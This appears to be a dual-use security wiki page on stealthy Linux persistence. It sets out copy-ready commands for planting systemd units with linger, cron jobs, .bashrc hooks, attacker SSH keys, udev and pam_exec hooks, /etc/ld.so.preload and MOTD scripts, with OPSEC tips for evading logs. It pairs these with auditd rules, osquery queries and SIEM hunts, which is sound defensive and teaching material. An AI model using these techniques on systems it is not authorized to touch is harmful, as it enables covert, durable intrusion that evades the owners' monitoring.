---
title: "Persistence Stealth"
parent: "1. Linux"
nav_order: 3
---

# Linux Persistence Stealth

*Quiet persistence mechanisms on Linux, ranked by stealth and reliability, each paired with the exact forensic artifact it leaves and the hunt that catches it.*

## What & why

The goal is durable code execution that survives reboot and login churn while producing the smallest, most plausible telemetry footprint. Every persistence primitive on Linux writes to a file and is read by a process at a known trigger (boot, login, shell start, device event, timer). The OPSEC rationale is that the trigger, not the implant, is what gets logged: cron emits a syslog line on every run, sshd logs every key-based login, systemd journals every unit start, and PAM writes to the auth log on every authentication. A quiet operator chooses mechanisms whose trigger is naturally noisy (so the new entry blends in), avoids world-readable drop locations that a janitor script or a curious user will read, and prefers user-scope over system-scope so a single compromised account does not require root and does not touch root-owned, monitored paths. Defenders win here with file integrity monitoring plus a small number of high-signal watches; this page gives both sides the same map. See also [Log Tampering and Timestomping](02-log-tampering.md) and [Auditd Evasion](04-auditd-evasion.md) for clearing the trail these mechanisms generate.

## Technique

### Stealth and reliability ranking

Higher = more reliable persistence and/or quieter. Reliability means "fires again after reboot without manual help". Stealth means "least likely to be in a default FIM baseline or an analyst's first ten greps".

| Mechanism | Survives reboot | Scope | World-readable drop | Logs on every trigger | Stealth |
|---|---|---|---|---|---|
| systemd system unit + timer | yes | root | unit file 0644 typical | journald start record | medium |
| systemd user unit + timer | yes (with lingering) | user | under `$HOME`, 0644 | journald (user) | high |
| cron (system `/etc/cron.d`) | yes | root | yes | cron syslog line per run | low |
| cron (user crontab) | yes | user | spool 0600 | cron syslog line per run | medium |
| `~/.bashrc` / `~/.profile` | login/shell only | user | yes | none directly | high |
| `/etc/profile.d/*.sh` | login shell | root | yes | none directly | medium |
| ssh `authorized_keys` | yes | user | often 0600 | sshd Accepted publickey | medium |
| udev rule | yes | root | yes | none by default | high |
| PAM `pam_exec` | yes (per auth) | root | yes | auth.log on each auth | low-medium |
| `/etc/ld.so.preload` | yes (global) | root | yes | none directly | low |
| `LD_PRELOAD` env (per-process) | no | user | n/a | none | high but fragile |
| XDG autostart `.desktop` | login (GUI) | user | yes | session/journald | medium |
| `at` job | one-shot | user | spool | atd syslog line | low (one-shot) |
| MOTD scripts (`/etc/update-motd.d`) | per ssh login | root | yes | none directly | medium |

### systemd units and timers

The most reliable modern mechanism. A unit plus a timer replaces cron with first-class journald integration, which is both a feature (managed restart) and a tell (everything is journaled).

System scope (requires root), drop a unit and a timer:

```bash
# /etc/systemd/system/sync-agent.service
[Unit]
Description=Cache sync helper

[Service]
Type=oneshot
ExecStart=/usr/local/bin/sync-agent
```

```bash
# /etc/systemd/system/sync-agent.timer
[Unit]
Description=Periodic cache sync

[Timer]
OnBootSec=2min
OnUnitActiveSec=15min
Persistent=true

[Install]
WantedBy=timers.target
```

```bash
# load and arm
sudo systemctl daemon-reload
sudo systemctl enable --now sync-agent.timer
```

`daemon-reload` re-reads unit files; `enable` creates a symlink under `/etc/systemd/system/timers.target.wants/`, which is itself an artifact. `Persistent=true` runs a missed timer at next boot, improving reliability across powered-off windows.

User scope (no root, quieter) writes under `$HOME` and is invisible to root-only FIM:

```bash
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/sync-agent.service <<'EOF'
[Unit]
Description=User cache sync

[Service]
Type=simple
ExecStart=%h/.local/bin/sync-agent
Restart=always
EOF

systemctl --user daemon-reload
systemctl --user enable --now sync-agent.service
# survives logout only if lingering is on:
loginctl enable-linger "$USER"
```

`enable-linger` writes `/var/lib/systemd/linger/<user>`, the single most important persistence-survival artifact for user units, and a high-signal hunt target. Without it the user manager dies at last logout.

### cron

System and user variants leave different artifacts and different log lines.

```bash
# system, root: /etc/cron.d/ entry needs a user field
echo '*/10 * * * * root /usr/local/bin/collect >/dev/null 2>&1' | sudo tee /etc/cron.d/collect

# user crontab: stored under the spool, no user field
( crontab -l 2>/dev/null; echo '*/10 * * * * /home/svc/collect' ) | crontab -
crontab -l            # read current user's table
sudo ls -la /var/spool/cron/crontabs/   # Debian path; RHEL: /var/spool/cron/
```

Every cron execution emits a syslog line. On Debian/Ubuntu it lands in `/var/log/syslog` (and journald) from the `CRON` facility; on RHEL in `/var/log/cron`. The line names the user and the command, for example:

```
CRON[12345]: (svc) CMD (/home/svc/collect)
```

This per-run line is the dominant tell for cron persistence. There is no silent cron run unless cron logging is suppressed at the syslog level.

### Shell init files

Triggered by shell start, never directly logged. Order matters: login shells read `/etc/profile` then `~/.bash_profile` or `~/.profile`; interactive non-login shells read `~/.bashrc`; `/etc/profile.d/*.sh` is sourced by `/etc/profile`.

```bash
# per-user, no log on trigger
printf '\n[ -x %s ] && %s &\n' "$HOME/.cache/.agent" "$HOME/.cache/.agent" >> ~/.bashrc

# system-wide login shells, root
printf '#!/bin/sh\n/usr/local/bin/agent &\n' | sudo tee /etc/profile.d/00-agent.sh
```

These produce no authentication or scheduler log on trigger; detection is FIM and content review, not log correlation.

### SSH authorized_keys

Adds an attacker key. Reliable across reboot and logged by sshd on use.

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat attacker.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Every login with that key writes to the auth log (`/var/log/auth.log` Debian, `/var/log/secure` RHEL):

```
sshd[2100]: Accepted publickey for svc from 192.0.2.10 port 50122 ssh2: ED25519 SHA256:<fp>
```

The key fingerprint in that line ties a session to a specific authorized key, which is how defenders pivot from a login to the planted entry. A `command=` or `from=` option restriction in the key line is a strong tell when present on a service account.

### udev rules

Device-event-triggered root execution. Fires when a matching device appears; an attacker can target a frequently-occurring event.

```bash
# /etc/udev/rules.d/99-agent.rules
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/local/bin/agent"
sudo udevadm control --reload-rules
```

`RUN+=` on long-running processes is discouraged by udev and can be killed, so quiet operators use it to spawn a detached helper. No dedicated log line is emitted by default; the artifact is the rule file plus the reload.

### PAM (pam_exec)

Runs a command on every authentication through the affected stack. Powerful and reliable, but loud because auth events are themselves logged.

```bash
# append to /etc/pam.d/sshd or common-auth
echo 'auth optional pam_exec.so seteuid /usr/local/bin/pam-agent' | sudo tee -a /etc/pam.d/sshd
```

Use `optional` so a failure never blocks login (a denied login is a much bigger tell than a quiet helper). The auth log records the surrounding PAM session/auth events on each trigger; the module invocation itself is not separately logged, but the cadence of the helper running on every login is the behavioral signature.

### LD_PRELOAD

Two flavors with very different blast radius. Global via `/etc/ld.so.preload` injects a shared object into nearly every dynamically linked process at exec (a rootkit-grade tell and a top FIM target). Per-process via the environment variable is fragile (set-uid binaries ignore it) but leaves no persistent file.

```bash
# global, root, extremely high impact and visibility
echo '/lib/x86_64-linux-gnu/libagent.so' | sudo tee /etc/ld.so.preload

# per-process, no persistent artifact, dies with the env
LD_PRELOAD=/tmp/.x/libagent.so /usr/bin/some-daemon
```

`/etc/ld.so.preload` existing at all is anomalous on most hosts; its presence alone is a finding.

### XDG autostart, at, and MOTD

```bash
# XDG autostart (GUI/desktop session login)
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/agent.desktop <<'EOF'
[Desktop Entry]
Type=Application
Exec=/home/svc/.local/bin/agent
X-GNOME-Autostart-enabled=true
EOF

# at: one-shot, schedules a single future run
echo '/usr/local/bin/agent' | at now + 1 hour
atq                              # list pending at jobs
sudo ls -la /var/spool/cron/atjobs/   # spooled job bodies

# MOTD: runs as root on each ssh login (Debian/Ubuntu)
printf '#!/bin/sh\n/usr/local/bin/agent &\n' | sudo tee /etc/update-motd.d/99-agent
sudo chmod +x /etc/update-motd.d/99-agent
```

`at` is one-shot, so it is for staging, not durable persistence. MOTD scripts run as root via `pam_motd` on each interactive ssh login and are commonly overlooked.

## OPSEC notes

What makes the loud version loud:

- Root, system-scope drops (`/etc/cron.d`, `/etc/systemd/system`, `/etc/ld.so.preload`, `/etc/pam.d`) land in directories that nearly every FIM baseline (AIDE, auditd, EDR) watches by default. The quiet variant prefers user scope under `$HOME`, which most root-focused baselines miss.
- World-readable drops (cron.d entries, profile.d scripts, udev rules, MOTD scripts are typically 0644) can be read by any local user and by routine config-management diffing. `authorized_keys` and user crontabs at 0600 are less exposed but still owned by a watched account.
- Per-trigger logging is the dividing line. cron, atd, sshd, and PAM emit a log entry on every single trigger; shell init files, profile.d, udev RUN, ld.so.preload, and MOTD emit nothing on trigger by themselves. If you must use a logging trigger, blend with existing cadence (a `*/15` schedule among other `*/15` jobs) rather than a unique interval like `*/7` that stands out in frequency analysis.

The quiet variant in practice: user systemd unit with `enable-linger`, or a single appended line in `~/.bashrc` that backgrounds a renamed helper out of a dotfile cache directory. Both avoid root paths and per-trigger logs.

Failure modes and tells:

- `systemctl --user` units die at logout without lingering; forgetting `enable-linger` is the most common reason user persistence "disappears".
- set-uid binaries strip `LD_PRELOAD` from the environment, so env-based injection silently no-ops against the very privileged targets operators want.
- A cron schedule with a non-standard interval or a command writing to `/dev/null 2>&1` (suppressing output mail) is itself a weak signature in frequency hunts.
- `pam_exec` without `optional`/`sufficient` discipline can lock out logins; a sudden auth failure spike points straight at the modified PAM stack.
- `/etc/ld.so.preload` is so rarely legitimately present that its mere existence is a near-certain detection.

## Detection & telemetry

Defenders should combine three layers: file integrity monitoring on the drop paths, auditd watches for write events, and scheduled osquery snapshots of the trigger tables. Logs from the noisy triggers (cron, sshd, PAM, atd) provide per-execution confirmation.

### Log sources by mechanism

- systemd unit start: journald. Query with `journalctl -u <unit>`; user units `journalctl --user -u <unit>`. Unit file creation is not journaled directly, so pair journald with FIM on the unit directories. Lingering enablement is the file `/var/lib/systemd/linger/<user>`.
- cron: `/var/log/syslog` and journald on Debian/Ubuntu, `/var/log/cron` on RHEL. Each run logs `(<user>) CMD (<command>)`. crontab edits via `crontab -e` are logged on some distros as `(<user>) REPLACE (<user>)` or `BEGIN EDIT/END EDIT` lines from the `crontab` binary.
- atd: syslog/journald line on job execution; spooled bodies under `/var/spool/cron/atjobs/` (Debian) and listed by `atq`.
- sshd auth: `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL). `Accepted publickey for <user> from <ip> ... SHA256:<fp>` ties the session to a key fingerprint.
- PAM: same auth log. Watch for a recurring helper process spawned around `pam_unix`/`pam_exec` session events on every login.
- file changes: AIDE database diff, auditd `SYSCALL`/`PATH` records, or EDR file-write telemetry on all drop paths.

### auditd watch rules

Add to `/etc/audit/rules.d/persistence.rules` and load with `augenrules --load`. The key (`-k`) is what you hunt on in `ausearch`/`aureport`.

```bash
# systemd units and timers
-w /etc/systemd/system/ -p wa -k persist_systemd
-w /usr/lib/systemd/system/ -p wa -k persist_systemd
-w /var/lib/systemd/linger/ -p wa -k persist_linger

# cron and at
-w /etc/crontab -p wa -k persist_cron
-w /etc/cron.d/ -p wa -k persist_cron
-w /etc/cron.daily/ -p wa -k persist_cron
-w /etc/cron.hourly/ -p wa -k persist_cron
-w /var/spool/cron/ -p wa -k persist_cron
-w /var/spool/cron/crontabs/ -p wa -k persist_cron

# shell init and profile
-w /etc/profile -p wa -k persist_profile
-w /etc/profile.d/ -p wa -k persist_profile
-w /etc/bash.bashrc -p wa -k persist_profile

# ssh keys (system-wide; user homes are harder, watch known service homes)
-w /etc/ssh/sshd_config -p wa -k persist_ssh
-w /home/svc/.ssh/authorized_keys -p wa -k persist_ssh

# loader and PAM and udev and motd
-w /etc/ld.so.preload -p wa -k persist_preload
-w /etc/pam.d/ -p wa -k persist_pam
-w /etc/udev/rules.d/ -p wa -k persist_udev
-w /etc/update-motd.d/ -p wa -k persist_motd
```

Hunt the keys:

```bash
ausearch -k persist_systemd -ts today
ausearch -k persist_preload          # any hit here is high priority
aureport -k --summary
```

Each match yields a `SYSCALL` record (with `auid`, `uid`, `exe`, `comm`) joined to a `PATH` record (the file written) and a `CWD` record. The `auid` (login uid) survives privilege changes and attributes the write to the originating human/account even after `su`/`sudo`.

### osquery pack snippet

Schedule these and diff results. `crontab`, `startup_items`, and `authorized_keys` are first-class osquery tables. Differential results surface new entries between snapshots.

```json
{
  "queries": {
    "new_cron": {
      "query": "SELECT event, minute, hour, day_of_month, month, day_of_week, command, path FROM crontab;",
      "interval": 300,
      "description": "All system and user cron entries; diff for new commands"
    },
    "systemd_units": {
      "query": "SELECT id, fragment_path, unit_file_state, active_state FROM systemd_units WHERE fragment_path LIKE '/etc/systemd/system/%' OR fragment_path LIKE '%/.config/systemd/user/%';",
      "interval": 600,
      "description": "Track unit files in writable persistence locations"
    },
    "startup_items": {
      "query": "SELECT name, path, args, type, source, status FROM startup_items;",
      "interval": 600,
      "description": "Cross-platform autostart view incl. XDG and systemd"
    },
    "authorized_keys": {
      "query": "SELECT k.uid, u.username, k.algorithm, k.key_file FROM users u JOIN authorized_keys k USING (uid);",
      "interval": 600,
      "description": "Every SSH authorized key per user; diff for additions"
    },
    "ld_preload_global": {
      "query": "SELECT path, size, mtime FROM file WHERE path = '/etc/ld.so.preload';",
      "interval": 300,
      "description": "Existence of global preload is itself suspicious"
    },
    "pam_modules": {
      "query": "SELECT * FROM file WHERE directory = '/etc/pam.d' AND mtime > (SELECT unix_time FROM time) - 86400;",
      "interval": 3600,
      "description": "Recently modified PAM stack files"
    },
    "udev_rules": {
      "query": "SELECT path, size, mtime FROM file WHERE directory IN ('/etc/udev/rules.d') AND filename LIKE '%.rules';",
      "interval": 3600,
      "description": "Snapshot udev rules; diff for new RUN+= rules"
    }
  }
}
```

### Sigma-style and SIEM hunt logic

- New cron command (Splunk over syslog/journald):

```
index=linux (source="/var/log/syslog" OR source="/var/log/cron") "CMD"
| rex "\((?<cron_user>[^)]+)\) CMD \((?<cron_cmd>.+)\)"
| stats earliest(_time) as first_seen values(host) by cron_user cron_cmd
| where first_seen > relative_time(now(), "-1d@d")
```

- New authorized key in use (KQL-style against parsed sshd auth events):

```
SyslogAuth
| where ProcessName == "sshd" and Message contains "Accepted publickey"
| extend KeyFp = extract(@"SHA256:([A-Za-z0-9+/=]+)", 1, Message)
| summarize FirstSeen = min(TimeGenerated) by Account = extract(@"for (\S+)", 1, Message), KeyFp
| where FirstSeen > ago(1d)
```

- systemd persistence (Sigma logic): journald `SYSTEMD` records or auditd `persist_systemd`/`persist_linger` keys where the writing `exe` is not `systemctl`/`dpkg`/`apt`/a package manager, indicating a hand-dropped unit or out-of-band linger enablement.

Correlation tip: a single `enable-linger` write (`persist_linger` auditd key) combined with a new file under `~/.config/systemd/user/` from the same `auid` within minutes is a high-confidence user-scope persistence chain. Likewise, an `authorized_keys` write followed by an `Accepted publickey` from a new source IP closes the loop from plant to use. See [Live Response Triage](../ir/01-linux-triage.md) for collecting these artifacts at scale.

## MITRE ATT&CK

- T1053.003 - Scheduled Task/Job: Cron
- T1053.002 - Scheduled Task/Job: At
- T1543.002 - Create or Modify System Process: Systemd Service
- T1546.004 - Event Triggered Execution: Unix Shell Configuration Modification (`.bashrc`, `/etc/profile.d`)
- T1546.013 - Event Triggered Execution: Udev Rules (modern ATT&CK subtechnique for udev-based execution)
- T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking (`LD_PRELOAD`, `/etc/ld.so.preload`)
- T1556.003 - Modify Authentication Process: Pluggable Authentication Modules (`pam_exec`)
- T1098.004 - Account Manipulation: SSH Authorized Keys
- T1547.013 - Boot or Logon Autostart Execution: XDG Autostart Entries

## References

- systemd.service / systemd.timer / systemd.unit man pages - https://www.freedesktop.org/software/systemd/man/systemd.service.html
- loginctl enable-linger, systemd-logind man page - https://www.freedesktop.org/software/systemd/man/loginctl.html
- crontab(5) and cron(8) man pages - https://man7.org/linux/man-pages/man5/crontab.5.html
- ld.so(8) man page (LD_PRELOAD, /etc/ld.so.preload) - https://man7.org/linux/man-pages/man8/ld.so.8.html
- pam_exec(8) man page - https://man7.org/linux/man-pages/man8/pam_exec.8.html
- sshd(8) and AuthorizedKeysFile / authorized_keys format - https://man7.org/linux/man-pages/man8/sshd.8.html
- MITRE ATT&CK Persistence (TA0003) matrix - https://attack.mitre.org/tactics/TA0003/
- osquery schema (crontab, systemd_units, authorized_keys, startup_items) - https://osquery.io/schema/
- auditd auditctl(8) and audit.rules(7) man pages - https://man7.org/linux/man-pages/man8/auditctl.8.html
